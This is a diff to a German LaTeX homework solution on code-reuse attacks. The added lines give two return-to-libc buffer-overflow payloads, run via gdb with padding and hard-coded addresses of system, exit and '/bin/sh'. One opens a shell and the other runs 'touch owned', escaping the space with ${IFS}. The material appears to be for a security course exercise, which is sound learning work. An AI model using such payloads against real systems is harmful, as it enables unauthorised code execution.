@@ -52,6 +52,29 @@ Sobald eine Funktion returnt, wird die nächste Instruktion im Stack ausgeführt
 Es wäre ein Problem, wenn die Funktion \verb|f| einen Parameter mehr erwartet, da sie dann die Adresse der Funktion \verb|g| als zweiten Parameter annimmt, während der erste Parameter der Funktion \verb|g| fälschlicherweise die Adresse dieser Funktion darstellt. Für die Funktion \verb|g| gilt nicht diese Einschränkung, da die Funktion \verb|g| die letzte Library-Funktion der Chain darstellt. Die vorigen Stackframes haben keinen Einfluss auf die Code Reuse Attack.\\
 Das Problem, wenn wir nach Funktion \verb|f| und \verb|g| noch eine weitere Funktion aufrufen wollen, liegt darin dass der Inhalt des vorigen Stackframes korrumpiert wird, sodass das Programm abstürzen könnte.
 \subsection{b)}
+Lösung Aufgabe 2 b) i):\\
+\begin{lstlisting}
+run $(python -c "print'\x90'*112 + '\x10\xcd\xe1\xf7' + '\x70\xff\xe0\xf7' + '\xcf\xb8\xf5\xf7'")
+\end{lstlisting}
+Zusammensetzung:
+\begin{itemize}
+\item 112 Byte Padding (Buffer)
+\item Adresse der Funktion "{}system"{}
+\item Adresse der Funktion "{}exit"{} \textbf{Für ordentliches Terminieren!}
+\item Adresse des Strings "{}/bin/sh"{}
+\end{itemize}
+Lösung Aufgabe 2b) i):\\
+\begin{lstlisting}
+run $(python -c "print'\x90'*112 + '\x10\xcd\xe1\xf7' + '\x70\xff\xe0\xf7' + '\x47\xd2\xff\xff' + 'touch$\x7BIFS\x7Downed'")
+\end{lstlisting}
+Zusammensetzung:
+\begin{itemize}
+\item 112 Byte Padding (Buffer)
+\item Adresse der Funktion "{}system"{}
+\item Adresse der Funktion "{}exit"{} \textbf{Für ordentliches Terminieren!}
+\item Adresse des Strings "{}touch owned"{}
+\item Befehl "{}touch owned"{}, wobei das Leerzeichen mithilfe der Umgebungsvariblen "{}IFS"{} escaped wird.
+\end{itemize}
 
 \section{Aufgabe 3: Stack Canaries}
 	
